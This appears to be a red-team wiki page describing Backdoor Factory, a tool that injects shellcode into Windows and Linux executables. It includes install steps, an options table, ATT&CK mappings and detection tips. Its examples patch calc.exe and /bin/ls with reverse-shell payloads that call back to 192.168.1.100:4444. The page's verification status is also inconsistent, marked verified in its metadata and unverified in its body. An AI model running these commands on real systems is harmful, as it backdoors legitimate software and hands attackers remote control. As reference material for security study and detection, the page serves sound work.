---
id: 1722aded-4785-494a-9571-e40fecfaf647
type: tool
verified: true
created_at: '2019-08-28T21:17:21.776912+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
tags:
  - post-exploitation
  - code-injection
  - backdoor
  - malware-development
url: 'https://github.com/spydersec/BackdoorFactory'
commands:
  - '[[commands/backdoor-factory-list-payloads]]'
  - '[[commands/backdoor-factory-patch-windows-pe]]'
  - '[[commands/backdoor-factory-patch-linux-elf]]'
validated: true
---

# backdoor-factory

**Status**: Unverified

## Overview

Backdoor Factory (BDF) is a tool designed to inject shellcode into existing executable binaries (Windows PE and Linux ELF formats) without disrupting their normal functionality. It is commonly used in red team operations to create stealthy backdoors in legitimate applications, evading basic static analysis.

## Description

The Backdoor Factory patches executables by locating suitable code caves or using cave-jumping techniques to insert user-defined shellcode, such as reverse shells or custom payloads. It supports both 32-bit and 64-bit architectures for Windows PE and Linux ELF (System V ABI) files. Not all binaries are compatible due to protections like ASLR or code signing; testing on targets is recommended before deployment. This tool is particularly useful for post-exploitation scenarios where an attacker needs to maintain persistence via modified legitimate software.

## Features

- Feature 1: Automatic code cave detection and injection for minimal footprint
- Feature 2: Support for multiple shellcode types (Metasploit, custom, reverse/bind shells)
- Feature 3: Cave-jumping for binaries without sufficient free space
- Feature 4: Cross-platform support (Windows PE x32/x64, Linux ELF x32/x64)
- Feature 5: Output of patched binaries that execute normally while establishing backdoors

## Installation

### Requirements

- Python 2.7 or 3.x
- Git
- Dependencies: pefile (for PE), elftools (for ELF)

### Install Commands

```bash
# Clone the repository
sudo git clone https://github.com/spydersec/BackdoorFactory.git /opt/backdoor-factory
cd /opt/backdoor-factory

# Install Python dependencies (for Ubuntu/Debian)
sudo apt update
sudo apt install python3-pip
pip3 install -r requirements.txt

# For Kali Linux (often pre-configurable)
sudo apt install backdoor-factory
```

On Windows, use Git Bash or WSL and follow similar steps, ensuring Python is in PATH.

## Basic Usage

```python
python backdoor-factory.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and options |
| -f FILE | Specify input executable file |
| -s SHELL | Specify shellcode payload name |
| -o OUTPUT | Specify output file path |
| -H HOST | Set callback host IP |
| -P PORT | Set callback port |
| -L | List available shellcodes |
| -J | Enable cave jumping |

## Examples

### Example 1: Basic Usage

List available payloads first:

```python
python backdoor-factory.py -L
```

Then patch a Windows executable:

```python
python backdoor-factory.py -f calc.exe -s windows/meterpreter/reverse_tcp -o calc_bd.exe -H 192.168.1.100 -P 4444
```

### Example 2: Advanced Usage

Patch a Linux ELF with cave jumping:

```python
python backdoor-factory.py -f /bin/ls -s linux/x86/shell_reverse_tcp -o ls_bd -H 192.168.1.100 -P 4444 -J
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Obfuscated Files or Information]] Obfuscated Files or Information
- [[Process Injection]] Process Injection
- [[Create or Modify System Process]] Create or Modify System Process

### Tactics

- [[Persistence]] Persistence
- [[Privilege Escalation]] Privilege Escalation
- [[Command and Control]] Command and Control

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Anomalous modifications to executable files (check file hashes, PE/ELF headers for injected code)
- Detection method 2: Behavioral analysis showing legitimate apps connecting outbound to unusual IPs/ports
- Detection method 3: Antivirus signatures for known shellcode patterns or Backdoor Factory artifacts
- Detection method 4: Monitoring for code cave alterations via tools like Volatility or ELF analysis

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[Metasploit]]
- [[Donut]]

## References

- Official GitHub: https://github.com/spydersec/BackdoorFactory
- Documentation: Included in repo README
- Related resources: Metasploit shellcode generation docs
